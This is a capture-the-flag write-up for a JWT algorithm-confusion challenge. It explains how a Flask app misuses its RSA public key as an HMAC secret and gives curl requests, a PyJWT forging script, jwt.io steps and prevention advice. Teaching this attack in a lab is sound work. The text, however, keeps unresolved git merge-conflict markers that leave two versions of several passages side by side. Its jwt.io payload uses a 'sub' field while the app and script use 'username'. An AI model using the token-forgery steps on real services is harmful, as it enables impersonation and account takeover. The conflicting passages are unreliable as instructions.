# Writeup: JWT Algorithm Confusion Challenge

## Challenge Overview
This challenge demonstrates a classic JWT algorithm confusion vulnerability where an attacker can forge an admin token by exploiting the server's misuse of the RSA public key as an HMAC-SHA256 secret when the token header specifies `alg: HS256`.

## Files Provided
- `app.py`: The vulnerable Flask web application
<<<<<<< HEAD
- `public.pem`: RSA public key (distributed to players)
- `private.pem`: RSA private key (included for completeness, normally kept secret)
- `flag.txt`: The flag to be captured
=======
- `public.pem`: RSA public key (**distribute to players** - needed for verification and as HS256 secret)
- `private.pem`: RSA private key (**keep secret on server only** - used to sign legitimate tokens, NOT distributed to players)
- `flag.txt`: The flag to be captured (place on server, not distributed)
>>>>>>> f496a21 (soap3)
- `requirements.txt`: Python dependencies
- `Dockerfile`: Optional containerization

## Vulnerability Details
The application:
1. Issues login tokens signed with RS256 using the private key (`/login` endpoint)
2. Verifies tokens at the `/profile` endpoint with flawed logic:
   - If token header specifies `alg: RS256`, verify with public key using RS256
   - If token header specifies `alg: HS256`, verify with the **same public key** treated as an HMAC-SHA256 secret

This misconfiguration allows an attacker to:
1. Obtain a legitimate token for a normal user
2. Decode it (no verification needed) to obtain the payload
3. Modify the payload (e.g., change username to "admin")
4. Change the header algorithm from `RS256` to `HS256`
5. Re-sign the token using HS256 with the public key as the secret
6. The server will accept this forged token because it uses the public key as the HMAC secret

## Exploitation Steps

### Step 1: Obtain a legitimate token
```bash
curl -X POST http://localhost:5000/login \
     -H "Content-Type: application/json" \
     -d '{"username": "user"}'
```
Response:
```json
{"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.xxxxxx"}
```

### Step 2: Examine the token
Decode the JWT (base64url) to see header and payload:
- Header: `{"alg":"RS256","typ":"JWT"}`
- Payload: `{"username":"user","exp":1719456000,...}`

### Step 3: Forge an admin token
<<<<<<< HEAD
Using Python with PyJWT:
=======
You can forge the token either with Python (if you have the environment) or directly via the jwt.io website.

#### Option A: Using Python with PyJWT
>>>>>>> f496a21 (soap3)
```python
import jwt

# Load the public key (will be used as HMAC secret)
with open('public.pem', 'r') as f:
    public_key = f.read()

# Original token from login (paste the token you received)
original_token = "PASTE_TOKEN_HERE"

# Decode without verification to get payload
decoded = jwt.decode(original_token, options={"verify_signature": False})

# Modify payload to impersonate admin
decoded['username'] = 'admin'
<<<<<<< HEAD
=======
decoded['role'] = 'admin'   # ensure role is admin
>>>>>>> f496a21 (soap3)

# Create forged token with HS256 algorithm and public key as secret
forged_token = jwt.encode(decoded, public_key, algorithm='HS256')

print("Forged token:", forged_token)
```

<<<<<<< HEAD
=======
#### Option B: Using jwt.io website
1. Go to https://jwt.io
2. Set **Algorithm** to `HS256`
3. Paste the entire contents of `public.pem` into the **Secret** field (include the `-----BEGIN PUBLIC KEY-----` and `-----END PUBLIC KEY-----` lines)
4. In the **Encoded** section, replace the payload with:
   ```json
   {
     "sub": "admin",
     "role": "admin",
     "exp": <expiry from original token or a future timestamp>
   }
   ```
   You can get the expiry by decoding the original token (without verification) – just copy the `exp` value.
5. The **Signature** box will automatically generate a forged token.
6. Copy the token from the **Encoded** section.


>>>>>>> f496a21 (soap3)
### Step 4: Use the forged token to get the flag
```bash
curl -H "Authorization: Bearer $FORGED_TOKEN" http://localhost:5000/profile
```
Response:
```json
{"message":"Welcome admin! Flag: HTB{jwt_alg_confusion_123}"}
```

## Why This Works
The server incorrectly treats the RSA public key as a symmetric secret for HS256 verification. Since the public key is known to everyone (it's distributed), an attacker can create a valid HMAC-SHA256 signature using it.

## Prevention
1. **Always specify expected algorithms** when decoding JWTs:
   ```python
   jwt.decode(token, key, algorithms=["RS256"])  # Explicitly expect only RS256
   ```
2. **Use separate keys** for symmetric and asymmetric algorithms.
3. **Validate the algorithm** in the header matches what you expect before decoding.
4. **Use a trusted JWT library** and follow its best practices.

## Difficulty Rating
- **Easy**: The verification code is straightforward and the vulnerability is clear from the source.
- **Medium**: To increase difficulty, you could:
  - Hide the verification logic in a middleware or separate module
  - Require chaining with another vulnerability (e.g., SSRF to steal the public key)
  - Use a more complex key hierarchy

## Learning Objectives
- Understand JWT structure (header.payload.signature)
- Recognize algorithm confusion attacks
- Learn proper JWT validation practices
- Experience exploiting a classic web vulnerability in a controlled environment

## References
- https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
- https://jwt.io/
- OWASP JWT Attacks Cheat Sheet
